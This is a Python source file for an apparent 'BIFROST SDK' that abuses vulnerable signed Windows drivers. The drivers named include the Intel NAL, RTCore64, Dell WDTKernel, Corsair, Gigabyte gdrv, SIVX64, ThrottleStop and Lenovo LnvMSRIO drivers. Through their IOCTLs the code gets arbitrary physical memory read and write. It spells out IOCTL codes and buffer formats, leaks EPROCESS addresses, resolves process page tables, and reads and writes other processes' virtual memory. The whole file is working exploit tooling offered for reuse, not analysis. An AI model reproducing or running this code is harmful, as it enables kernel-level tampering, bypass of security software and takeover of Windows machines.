"""
BIFROST SDK — Vulnerable Driver Interface
Communicates with loaded vulnerable signed drivers to perform
physical memory R/W and virtual-to-physical address translation.

Supports multiple drivers polymorphically via IoctlStrategy:
  - Intel Network Adapter (iqvw64e.sys)   — bulk physical R/W
  - MSI Afterburner (RTCore64.sys)        — DWORD-at-a-time R/W
  - Dell Watchdog Timer (WDTKernel.sys)   — DWORD-at-a-time R/W via MmMapIoSpace
  - Corsair iCUE (CorsairLLAccess64.sys)  — MMIO R/W via MmMapIoSpace
  - Gigabyte GIO (gdrv.sys)               — ring0 memcpy bulk R/W
  - SIV Monitor (SIVX64.sys)              — scatter read + mapped write via raw cmds
  - ThrottleStop (ThrottleStop.sys)       — QWORD-at-a-time R/W (CVE-2025-7771)
  - Lenovo Dispatcher (LnvMSRIO.sys)      — struct phys R/W (CVE-2025-8061)
"""

from __future__ import annotations

import atexit
import ctypes
import ctypes.wintypes as wt
import os
import struct
import sys
from abc import ABC, abstractmethod
from dataclasses import dataclass
from enum import IntEnum
from typing import Optional

# Make sure we can import mapper
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
try:
    from drivers.mapper import DriverMapper, DriverType
except ImportError:
    pass

k32 = ctypes.windll.kernel32

class IoctlStrategy(ABC):
    @abstractmethod
    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        pass

    @abstractmethod
    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        pass

class IntelStrategy(IoctlStrategy):
    """Strategy for iqvw64e.sys (Intel NAL)"""
    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        buf = (ctypes.c_byte * size)()
        in_buf = struct.pack("<QIQ", phys_addr, size, ctypes.addressof(buf))
        in_buf_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
        bytes_returned = wt.DWORD(0)

        success = k32.DeviceIoControl(
            handle, 0x80862007,
            ctypes.byref(in_buf_ct), len(in_buf),
            ctypes.byref(buf), size,
            ctypes.byref(bytes_returned), None,
        )
        if not success:
            raise OSError(f"Intel phys read failed at 0x{phys_addr:X}")
        return bytes(buf)

    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        size = len(data)
        buf = (ctypes.c_byte * size)(*data)
        in_buf = struct.pack("<QIQ", phys_addr, size, ctypes.addressof(buf))
        in_buf_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
        bytes_returned = wt.DWORD(0)

        success = k32.DeviceIoControl(
            handle, 0x80862008,
            ctypes.byref(in_buf_ct), len(in_buf),
            None, 0,
            ctypes.byref(bytes_returned), None,
        )
        return bool(success)

class MsiStrategy(IoctlStrategy):
    """Strategy for RTCore64.sys (MSI Afterburner)"""
    class RTC64(ctypes.Structure):
        _fields_ = [
            ("Pad0", ctypes.c_uint8 * 8),
            ("Address", ctypes.c_uint64),
            ("Pad1", ctypes.c_uint8 * 4),
            ("Offset", ctypes.c_uint32),
            ("Size", ctypes.c_uint32),
            ("Value", ctypes.c_uint32),
            ("Pad2", ctypes.c_uint8 * 16),
        ]

    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        # RTCore64 typically does memory reads by 4 bytes (DWORD) at a time
        result = bytearray()
        bytes_returned = wt.DWORD(0)
        
        for offset in range(0, size, 4):
            req = self.RTC64()
            req.Address = phys_addr + offset
            req.Size = 4
            
            success = k32.DeviceIoControl(
                handle, 0x80002048,
                ctypes.byref(req), ctypes.sizeof(req),
                ctypes.byref(req), ctypes.sizeof(req),
                ctypes.byref(bytes_returned), None,
            )
            
            if not success:
                raise OSError(f"MSI phys read failed at 0x{phys_addr + offset:X}")
                
            chunk_size = min(4, size - offset)
            val_bytes = struct.pack("<I", req.Value)
            result.extend(val_bytes[:chunk_size])
            
        return bytes(result)

    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        bytes_returned = wt.DWORD(0)
        size = len(data)
        
        for offset in range(0, size, 4):
            chunk = data[offset:offset+4]
            # Pad chunk to 4 bytes if necessary
            if len(chunk) < 4:
                chunk += b"\x00" * (4 - len(chunk))
            
            val = struct.unpack("<I", chunk)[0]
            
            req = self.RTC64()
            req.Address = phys_addr + offset
            req.Size = 4
            req.Value = val
            
            success = k32.DeviceIoControl(
                handle, 0x8000204C,
                ctypes.byref(req), ctypes.sizeof(req),
                ctypes.byref(req), ctypes.sizeof(req),
                ctypes.byref(bytes_returned), None,
            )
            if not success:
                return False
        return True

class WdtStrategy(IoctlStrategy):
    """
    Strategy for WDTKernel.sys (Dell Watchdog Timer Kernel Driver).
    WHQL signed by Microsoft. Uses MmMapIoSpace with zero validation.
    DWORD-at-a-time access like MSI, but with a simpler buffer layout.

    Buffer format:
      Read  (0x9C412400): input  = { UINT64 phys_addr } → output DWORD in same buffer
      Write (0x9C41240C): input  = { UINT64 phys_addr; UINT32 value }
      Bulk variants also exist (0x9C412418 read, 0x9C412424 write) but DWORD is safest.
    """

    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        result = bytearray()
        bytes_returned = wt.DWORD(0)

        for offset in range(0, size, 4):
            # Input: 8-byte physical address
            in_buf = struct.pack("<Q", phys_addr + offset)
            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
            # Output: reuse same buffer, driver writes DWORD value
            out_buf = (ctypes.c_byte * 4)()

            success = k32.DeviceIoControl(
                handle, 0x9C412400,
                ctypes.byref(in_ct), len(in_buf),
                ctypes.byref(out_buf), 4,
                ctypes.byref(bytes_returned), None,
            )
            if not success:
                raise OSError(f"WDT phys read failed at 0x{phys_addr + offset:X}")

            chunk_size = min(4, size - offset)
            result.extend(bytes(out_buf)[:chunk_size])

        return bytes(result)

    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        bytes_returned = wt.DWORD(0)
        size = len(data)

        for offset in range(0, size, 4):
            chunk = data[offset:offset + 4]
            if len(chunk) < 4:
                chunk += b"\x00" * (4 - len(chunk))

            val = struct.unpack("<I", chunk)[0]
            # Input: 8-byte physical address + 4-byte value
            in_buf = struct.pack("<QI", phys_addr + offset, val)
            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)

            success = k32.DeviceIoControl(
                handle, 0x9C41240C,
                ctypes.byref(in_ct), len(in_buf),
                None, 0,
                ctypes.byref(bytes_returned), None,
            )
            if not success:
                return False
        return True


class CorsairStrategy(IoctlStrategy):
    """
    Strategy for CorsairLLAccess64.sys (Corsair iCUE / Corsair Link).
    WHQL signed by Microsoft. Exposes full physical memory via MmMapIoSpace.

    MMIO Read  (0x229350): input = { UINT32 phys_addr, UINT8 access_size (1/2/4) }
    MMIO Write (0x22934c): input = { UINT32 phys_addr, UINT8 access_size, UINT32 value }

    Also has PhysMem MAP to usermode (0x225374) for 64-bit addresses,
    but we use MMIO for simplicity (loops in 4-byte chunks).
    Limitation: MMIO IOCTLs use 32-bit physical addresses. For addresses >4GB,
    use the PhysMem MAP IOCTL (0x225374) which supports full 64-bit.
    """

    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        result = bytearray()
        bytes_returned = wt.DWORD(0)

        for offset in range(0, size, 4):
            addr32 = (phys_addr + offset) & 0xFFFFFFFF
            chunk_size = min(4, size - offset)
            access_size = chunk_size if chunk_size in (1, 2, 4) else 4

            # Input: { UINT32 phys_addr, UINT8 access_size }
            in_buf = struct.pack("<IB", addr32, access_size)
            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
            out_buf = (ctypes.c_byte * 4)()

            success = k32.DeviceIoControl(
                handle, 0x229350,
                ctypes.byref(in_ct), len(in_buf),
                ctypes.byref(out_buf), 4,
                ctypes.byref(bytes_returned), None,
            )
            if not success:
                raise OSError(f"Corsair MMIO read failed at 0x{phys_addr + offset:X}")

            result.extend(bytes(out_buf)[:chunk_size])

        return bytes(result)

    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        bytes_returned = wt.DWORD(0)
        size = len(data)

        for offset in range(0, size, 4):
            chunk = data[offset:offset + 4]
            if len(chunk) < 4:
                chunk += b"\x00" * (4 - len(chunk))

            addr32 = (phys_addr + offset) & 0xFFFFFFFF
            val = struct.unpack("<I", chunk)[0]
            chunk_size = min(4, size - offset)
            access_size = chunk_size if chunk_size in (1, 2, 4) else 4

            # Input: { UINT32 phys_addr, UINT8 access_size, UINT32 value }
            in_buf = struct.pack("<IBI", addr32, access_size, val)
            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)

            success = k32.DeviceIoControl(
                handle, 0x22934c,
                ctypes.byref(in_ct), len(in_buf),
                None, 0,
                ctypes.byref(bytes_returned), None,
            )
            if not success:
                return False
        return True


class GigabyteStrategy(IoctlStrategy):
    """
    Strategy for gdrv.sys (Gigabyte GIO driver).
    VeriSign signed. CVE-2018-19320/19321/19322/19323.

    Exposes ring0 memcpy — reads/writes arbitrary physical memory in bulk.
    No DWORD-at-a-time limitation. Also has MSR R/W (0xC3502580) and IO port access.

    Physical Read  (0xC3502004): input = { UINT64 interface_type=1, UINT64 bus=0,
                                            UINT64 phys_addr, UINT32 size, UINT64 out_ptr }
    Physical Write (0xC3502008): same layout with data appended.
    """

    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        out_buf = (ctypes.c_byte * size)()
        bytes_returned = wt.DWORD(0)

        # GIO memcpy-read input: interface_type(8) + bus(8) + phys_addr(8) + size(4) + out_ptr(8)
        in_buf = struct.pack("<QQQI Q",
                             1,                        # Interface type (memory)
                             0,                        # Bus number
                             phys_addr,                # Physical address
                             size,                     # Bytes to read
                             ctypes.addressof(out_buf) # Output buffer pointer
                             )
        in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)

        success = k32.DeviceIoControl(
            handle, 0xC3502004,
            ctypes.byref(in_ct), len(in_buf),
            ctypes.byref(out_buf), size,
            ctypes.byref(bytes_returned), None,
        )
        if not success:
            raise OSError(f"Gigabyte GIO phys read failed at 0x{phys_addr:X}")
        return bytes(out_buf)

    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        size = len(data)
        data_buf = (ctypes.c_byte * size)(*data)
        bytes_returned = wt.DWORD(0)

        # GIO memcpy-write input: interface_type(8) + bus(8) + phys_addr(8) + size(4) + data_ptr(8)
        in_buf = struct.pack("<QQQI Q",
                             1,                         # Interface type (memory)
                             0,                         # Bus number
                             phys_addr,                 # Physical address
                             size,                      # Bytes to write
                             ctypes.addressof(data_buf) # Data buffer pointer
                             )
        in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)

        success = k32.DeviceIoControl(
            handle, 0xC3502008,
            ctypes.byref(in_ct), len(in_buf),
            None, 0,
            ctypes.byref(bytes_returned), None,
        )
        return bool(success)


class SivStrategy(IoctlStrategy):
    """Strategy for SIVX64.sys (SIV System Information Viewer monitor).

    WHQL-signed, no auth on the device. Raw integer IOCTLs (NOT CTL_CODEs,
    passed straight as dwIoControlCode) to \\\\.\\SIVDRIVER.

    Scatter Read (0x10): input = { UINT64 phys } (8 bytes), output = data
        (4..0x40000 bytes). Bulk Read (0x13) covers 0x400..16MB but scatter
        is enough with chunking, so reads use 0x10.
    Map+Write (0x14): input = header(0x30) + N x 0x18 entries
        { UINT32 reg_off, UINT32 mask, UINT32 value, ... }; flags bit1 =
        write-enable. computed = (read & mask) | value, so mask=0 writes
        the value verbatim. DWORD granularity, page-chunked.
    Sources: sai2fast/Vulnerable-Monitors sivx64_poc.py,
    dwgx/driver-vuln-research SIVX64/physmem_protocol.md.
    """

    _READ = 0x10
    _WRITE = 0x14
    _READ_CHUNK = 0x10000  # 64KB, well under the 256KB cap

    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        res = bytearray()
        br = wt.DWORD(0)
        for off in range(0, size, self._READ_CHUNK):
            chunk = min(self._READ_CHUNK, size - off)
            in_buf = struct.pack("<Q", phys_addr + off)
            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
            out_buf = (ctypes.c_byte * chunk)()
            ok = k32.DeviceIoControl(handle, self._READ,
                                     ctypes.byref(in_ct), len(in_buf),
                                     ctypes.byref(out_buf), chunk,
                                     ctypes.byref(br), None)
            if not ok:
                raise OSError(f"SIV scatter read failed at 0x{phys_addr + off:X}")
            res.extend(bytes(out_buf)[:br.value or chunk])
        return bytes(res)

    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        # Group bytes by 4KB page, then by aligned dword. Full dwords go
        # out verbatim (mask=0); partial ones read-merge-write so untouched
        # bytes survive.
        pages: dict[int, list[tuple[int, int]]] = {}
        for i, b in enumerate(data):
            a = phys_addr + i
            pages.setdefault(a & ~0xFFF, []).append((a, b))
        for page_base, items in pages.items():
            by_dword: dict[int, dict[int, int]] = {}
            for a, b in items:
                by_dword.setdefault(a & ~3, {})[a & 3] = b
            ops = []
            for d, parts in by_dword.items():
                if len(parts) == 4:
                    val = sum(v << (s * 8) for s, v in parts.items())
                else:
                    merged = bytearray(self.read_physical(handle, d, 4))
                    for s, v in parts.items():
                        merged[s] = v
                    val = struct.unpack("<I", bytes(merged))[0]
                ops.append((d - page_base, 0, val))
            if not self._write_page(handle, page_base, ops):
                return False
        return True

    def _write_page(self, handle, page_base, dwords) -> bool:
        n = len(dwords)
        header = struct.pack("<QIHHIH26x",
                             page_base, 0x1000, 0, 0x02, 0, n)
        body = b"".join(struct.pack("<III I I I", reg, mask, val, 0, 0, 0)
                        for reg, mask, val in dwords)
        buf = header + body
        io = (ctypes.c_byte * len(buf))(*buf)
        br = wt.DWORD(0)
        ok = k32.DeviceIoControl(handle, self._WRITE,
                                 ctypes.byref(io), len(buf),
                                 ctypes.byref(io), len(buf),
                                 ctypes.byref(br), None)
        return bool(ok)


class ThrottleStopStrategy(IoctlStrategy):
    """Strategy for ThrottleStop.sys (TechPowerUp, CVE-2025-7771).

    QWORD-at-a-time phys R/W via MmMapIoSpace, no validation.
    Read (0x80006498): input = { UINT64 phys }, output size selects 1/2/4/8.
    Write (0x8000649C): input = { UINT64 phys, UINT64 value } (16 bytes).
    Device \\\\.\\ThrottleStop. Source: fxrstor/ThrottleStopPoC,
    D4rkks/CVE-2025-7771-Vulnerability-Exploration.
    """

    _READ = 0x80006498
    _WRITE = 0x8000649C

    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        res = bytearray()
        br = wt.DWORD(0)
        for off in range(0, size, 8):
            in_buf = struct.pack("<Q", phys_addr + off)
            in_ct = (ctypes.c_byte * 8)(*in_buf)
            out_buf = (ctypes.c_byte * 8)()
            ok = k32.DeviceIoControl(handle, self._READ,
                                     ctypes.byref(in_ct), 8,
                                     ctypes.byref(out_buf), 8,
                                     ctypes.byref(br), None)
            if not ok:
                raise OSError(f"ThrottleStop read failed at 0x{phys_addr + off:X}")
            res.extend(bytes(out_buf)[:min(8, size - off)])
        return bytes(res)

    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        br = wt.DWORD(0)
        for off in range(0, len(data), 8):
            chunk = data[off:off + 8]
            if len(chunk) < 8:
                chunk += b"\x00" * (8 - len(chunk))
            in_buf = struct.pack("<QQ", phys_addr + off,
                                 struct.unpack("<Q", chunk)[0])
            in_ct = (ctypes.c_byte * 16)(*in_buf)
            ok = k32.DeviceIoControl(handle, self._WRITE,
                                     ctypes.byref(in_ct), 16,
                                     None, 0, ctypes.byref(br), None)
            if not ok:
                return False
        return True


class LenovoMsrStrategy(IoctlStrategy):
    """Strategy for LnvMSRIO.sys (Lenovo Dispatcher 3.0/3.1, CVE-2025-8061).

    Read (0x9C406104): input = { UINT64 phys, UINT32 op=1, UINT32 size },
        output = data. Write (0x9C40A108): input = { UINT64 phys,
        UINT32 op=1, UINT32 variant, byte data[] } -- variant selects the
        memcpy width (1/2/8); writes go out in 8-byte units, variant 8.
    Device \\\\.\\WinMsrDev. Source: Quarkslab CVE-2025-8061 parts 1+2,
    nefariousplan writeup (structs verified across 3 PoCs).
    """

    _READ = 0x9C406104
    _WRITE = 0x9C40A108
    _CHUNK = 0x1000

    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        res = bytearray()
        br = wt.DWORD(0)
        for off in range(0, size, self._CHUNK):
            chunk = min(self._CHUNK, size - off)
            in_buf = struct.pack("<QII", phys_addr + off, 1, chunk)
            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
            out_buf = (ctypes.c_byte * chunk)()
            ok = k32.DeviceIoControl(handle, self._READ,
                                     ctypes.byref(in_ct), len(in_buf),
                                     ctypes.byref(out_buf), chunk,
                                     ctypes.byref(br), None)
            if not ok:
                raise OSError(f"Lenovo read failed at 0x{phys_addr + off:X}")
            res.extend(bytes(out_buf)[:br.value or chunk])
        return bytes(res)

    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        br = wt.DWORD(0)
        for off in range(0, len(data), 8):
            chunk = data[off:off + 8]
            if len(chunk) < 8:
                chunk += b"\x00" * (8 - len(chunk))
            in_buf = struct.pack("<QII", phys_addr + off, 1, 8) + chunk
            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
            ok = k32.DeviceIoControl(handle, self._WRITE,
                                     ctypes.byref(in_ct), len(in_buf),
                                     None, 0, ctypes.byref(br), None)
            if not ok:
                return False
        return True


class GenericBulkStrategy(IoctlStrategy):
    """Generic BYO bulk phys R/W — Intel QIQ template with custom IOCTL codes."""
    def __init__(self, read_code: int, write_code: int):
        self._r = read_code
        self._w = write_code
    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        if not self._r:
            raise RuntimeError("BYO driver missing ioctl_read for bulk strategy")
        buf = (ctypes.c_byte * size)()
        in_buf = struct.pack("<QIQ", phys_addr, size, ctypes.addressof(buf))
        in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
        br = wt.DWORD(0)
        ok = k32.DeviceIoControl(handle, self._r, ctypes.byref(in_ct), len(in_buf), ctypes.byref(buf), size, ctypes.byref(br), None)
        if not ok:
            raise OSError(f"BYO bulk read failed at 0x{phys_addr:X} (code 0x{self._r:X})")
        return bytes(buf)
    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        if not self._w:
            raise RuntimeError("BYO driver missing ioctl_write for bulk strategy")
        size = len(data)
        buf = (ctypes.c_byte * size)(*data)
        in_buf = struct.pack("<QIQ", phys_addr, size, ctypes.addressof(buf))
        in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
        br = wt.DWORD(0)
        ok = k32.DeviceIoControl(handle, self._w, ctypes.byref(in_ct), len(in_buf), None, 0, ctypes.byref(br), None)
        return bool(ok)

class GenericDwordStrategy(IoctlStrategy):
    """Generic BYO DWORD loop — MSI RTCore template with custom IOCTL codes."""
    class Req(ctypes.Structure):
        _fields_ = [("Pad0", ctypes.c_uint8 * 8), ("Address", ctypes.c_uint64), ("Pad1", ctypes.c_uint8 * 4), ("Offset", ctypes.c_uint32), ("Size", ctypes.c_uint32), ("Value", ctypes.c_uint32), ("Pad2", ctypes.c_uint8 * 16)]
    def __init__(self, read_code: int, write_code: int):
        self._r = read_code
        self._w = write_code
    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
        if not self._r:
            raise RuntimeError("BYO driver missing ioctl_read for dword strategy")
        res = bytearray(); br = wt.DWORD(0)
        for off in range(0, size, 4):
            req = self.Req(); req.Address = phys_addr + off; req.Size = 4
            ok = k32.DeviceIoControl(handle, self._r, ctypes.byref(req), ctypes.sizeof(req), ctypes.byref(req), ctypes.sizeof(req), ctypes.byref(br), None)
            if not ok:
                raise OSError(f"BYO dword read failed at 0x{phys_addr+off:X}")
            chunk = min(4, size - off)
            res.extend(struct.pack("<I", req.Value)[:chunk])
        return bytes(res)
    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
        if not self._w:
            raise RuntimeError("BYO driver missing ioctl_write for dword strategy")
        br = wt.DWORD(0)
        for off in range(0, len(data), 4):
            chunk = data[off:off+4]
            if len(chunk) < 4: chunk += b"\x00"*(4-len(chunk))
            req = self.Req(); req.Address = phys_addr + off; req.Size = 4; req.Value = struct.unpack("<I", chunk)[0]
            ok = k32.DeviceIoControl(handle, self._w, ctypes.byref(req), ctypes.sizeof(req), ctypes.byref(req), ctypes.sizeof(req), ctypes.byref(br), None)
            if not ok:
                return False
        return True

class DriverInterface:
    """
    Polymorphic interface to vulnerable kernel drivers for physical memory access.
    """
    def __init__(self, driver_key: Optional[str] = None, driver_path: Optional[str] = None):
        self._handle: int = 0
        self._mapper = None
        self._strategy: Optional[IoctlStrategy] = None
        self._page_table_cache: dict[int, int] = {}
        self._driver_key = driver_key

        # Load via Mapper automatically — driver_key=None = auto-detect, or explicit BYO key
        try:
            mapper = DriverMapper()
            if mapper.load(driver_key) if driver_key else mapper.load():
                self._mapper = mapper
                self._handle = mapper.device_handle
                self._set_strategy(mapper.profile.driver_type, mapper.profile)
                atexit.register(self.unload)

            else:
                raise RuntimeError("DriverMapper failed to load.")
        except Exception as e:
            print(f"[DriverInterface] Error loading driver via mapper: {e}")

    def _set_strategy(self, d_type, profile=None):
        # BYO CUSTOM — pick generic template based on byo meta
        if d_type == DriverType.CUSTOM and profile is not None:
            meta = getattr(profile, "_byo_meta", {}) or {}
            strat = str(meta.get("strategy","")).lower()
            rc = getattr(profile, "ioctl_read", 0) or 0
            wc = getattr(profile, "ioctl_write", 0) or 0
            if strat in ("generic_dword", "dword", "msi"):
                self._strategy = GenericDwordStrategy(rc, wc)
                return
            # default bulk
            self._strategy = GenericBulkStrategy(rc, wc)
            return
        STRATEGY_MAP = {
            DriverType.INTEL_NAL: IntelStrategy,
            DriverType.MSI_RTCORE: MsiStrategy,
            DriverType.DELL_WDT: WdtStrategy,
            DriverType.CORSAIR_LL: CorsairStrategy,
            DriverType.GIGABYTE_GIO: GigabyteStrategy,
            DriverType.SIV_SIVX64: SivStrategy,
            DriverType.THROTTLESTOP_TS: ThrottleStopStrategy,
            DriverType.LENOVO_LNVMSRIO: LenovoMsrStrategy,
        }
        cls = STRATEGY_MAP.get(d_type)
        if cls:
            self._strategy = cls()
        else:
            # CUSTOM without profile yet — fallback generic bulk
            if d_type == DriverType.CUSTOM:
                self._strategy = GenericBulkStrategy(0, 0)
            else:
                print(f"[!] No strategy for {d_type}, falling back to Intel.")
                self._strategy = IntelStrategy()

    def unload(self):
        if self._mapper and self._mapper.is_loaded:
            self._mapper.unload()
            self._handle = 0

    def read_physical(self, phys_addr: int, size: int) -> bytes:
        if not self._strategy or not self._handle:
            raise RuntimeError("Driver not initialized.")
        return self._strategy.read_physical(self._handle, phys_addr, size)

    def write_physical(self, phys_addr: int, data: bytes) -> bool:
        if not self._strategy or not self._handle:
            raise RuntimeError("Driver not initialized.")
        return self._strategy.write_physical(self._handle, phys_addr, data)

    def get_process_cr3(self, pid: int) -> int:
        eprocess = self._find_eprocess(pid)
        if not eprocess:
            raise RuntimeError(f"Could not locate EPROCESS for PID {pid}")
        # EPROCESS->DirectoryTableBase varies by Windows build:
        #   0x28  Win10 1803+ / Win11 (current)
        #   0x388 older builds (pre-1803)
        #   0x380 very old builds
        DTB_OFFSETS = (0x28, 0x388, 0x380)
        for off in DTB_OFFSETS:
            dtb_bytes = self.read_physical(eprocess + off, 8)
            if len(dtb_bytes) != 8:
                continue
            dtb = struct.unpack("<Q", dtb_bytes)[0]
            # DTB must be page-aligned and nonzero.
            if not dtb or dtb % 0x1000 != 0:
                continue
            # Plausibility gate: a real PML4 has at least one present entry
            # in the first 0x100 bytes (kernel-half entries are always set).
            # A garbage page-aligned value fails this and we move on instead
            # of translating every read through a fake page table.
            try:
                probe = self.read_physical(dtb, 0x100)
                if len(probe) == 0x100 and any(
                    (struct.unpack_from("<Q", probe, i)[0] & 1) for i in range(0, 0x100, 8)
                ):
                    return dtb
            except Exception:
                continue
        raise RuntimeError(f"Failed to resolve DTB for EPROCESS {eprocess:#x}")

    def _find_eprocess(self, target_pid: int) -> int:
        handle = 0
        try:
            handle = ctypes.windll.kernel32.OpenProcess(0x1000, False, target_pid)
            if not handle:
                return 0

            ntdll = ctypes.windll.ntdll
            SystemExtendedHandleInformation = 0x40
            
            buf_size = 1024 * 1024
            buf = ctypes.create_string_buffer(buf_size)
            return_length = ctypes.c_ulong(0)
            
            status = ntdll.NtQuerySystemInformation(
                SystemExtendedHandleInformation,
                buf,
                buf_size,
                ctypes.byref(return_length)
            )
            
            while status == 0xC0000004:
                buf_size = return_length.value + 4096
                buf = ctypes.create_string_buffer(buf_size)
                status = ntdll.NtQuerySystemInformation(
                    SystemExtendedHandleInformation,
                    buf,
                    buf_size,
                    ctypes.byref(return_length)
                )
                
            if status != 0:
                return 0
                
            num_handles = struct.unpack_from("<Q", buf, 0)[0]
            my_pid = os.getpid()
            
            offset = 16
            for _ in range(num_handles):
                if offset + 40 > buf_size:
                    break
                    
                obj, pid, hval = struct.unpack_from("<QQQ", buf, offset)
                if pid == my_pid and hval == handle:
                    return obj
                offset += 40
                
            return 0
        except OSError as oe:
            # e.g. Access Denied (ERROR_ACCESS_DENIED)
            print(f"[-] _find_eprocess: OpenProcess failed: {oe}")
            return 0
        except Exception as e:
            print(f"[-] _find_eprocess: Unexpected error: {e}")
            return 0
        finally:
            if handle:
                ctypes.windll.kernel32.CloseHandle(handle)

    def translate_virtual(self, cr3: int, virtual_addr: int) -> int:
        page_va = virtual_addr & ~0xFFF
        if page_va in self._page_table_cache:
            return self._page_table_cache[page_va] | (virtual_addr & 0xFFF)

        pml4_idx = (virtual_addr >> 39) & 0x1FF
        pdpt_idx = (virtual_addr >> 30) & 0x1FF
        pd_idx = (virtual_addr >> 21) & 0x1FF
        pt_idx = (virtual_addr >> 12) & 0x1FF
        page_offset = virtual_addr & 0xFFF

        pml4e = struct.unpack("<Q", self.read_physical((cr3 & ~0xFFF) + pml4_idx * 8, 8))[0]
        if not (pml4e & 1): return 0

        pdpte = struct.unpack("<Q", self.read_physical((pml4e & 0x000FFFFFFFFFF000) + pdpt_idx * 8, 8))[0]
        if not (pdpte & 1): return 0
        if pdpte & 0x80: return (pdpte & 0x000FFFFFC0000000) | (virtual_addr & 0x3FFFFFFF)

        pde = struct.unpack("<Q", self.read_physical((pdpte & 0x000FFFFFFFFFF000) + pd_idx * 8, 8))[0]
        if not (pde & 1): return 0
        if pde & 0x80:
            phys = (pde & 0x000FFFFFFFE00000) | (virtual_addr & 0x1FFFFF)
            self._page_table_cache[page_va] = phys & ~0xFFF
            return phys

        pte = struct.unpack("<Q", self.read_physical((pde & 0x000FFFFFFFFFF000) + pt_idx * 8, 8))[0]
        if not (pte & 1): return 0

        phys = (pte & 0x000FFFFFFFFFF000) | page_offset
        self._page_table_cache[page_va] = pte & 0x000FFFFFFFFFF000
        return phys

    def read_virtual(self, cr3: int, virtual_addr: int, size: int) -> bytes:
        result = bytearray()
        remaining = size
        current_va = virtual_addr

        while remaining > 0:
            chunk = min(remaining, 0x1000 - (current_va & 0xFFF))
            phys = self.translate_virtual(cr3, current_va)
            if phys == 0:
                # Unmapped page — a real read failure, not zero memory.
                raise RuntimeError(
                    f"Page not present at VA {current_va:#x} (CR3 {cr3:#x})"
                )
            data = self.read_physical(phys, chunk)
            if len(data) != chunk:
                raise RuntimeError(
                    f"Short physical read at {phys:#x}: wanted {chunk}, got {len(data)}"
                )
            result.extend(data)
            current_va += chunk
            remaining -= chunk
        return bytes(result)

    def write_virtual(self, cr3: int, virtual_addr: int, data: bytes) -> bool:
        remaining = len(data)
        offset = 0
        current_va = virtual_addr

        while remaining > 0:
            chunk = min(remaining, 0x1000 - (current_va & 0xFFF))
            phys = self.translate_virtual(cr3, current_va)
            if phys == 0 or not self.write_physical(phys, data[offset:offset + chunk]):
                return False
            current_va += chunk
            offset += chunk
            remaining -= chunk
        return True

    @property
    def is_loaded(self) -> bool:
        return self._handle != 0

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.unload()

    def __del__(self):
        if self.is_loaded:
            try:
                self.unload()
            except Exception:
                pass
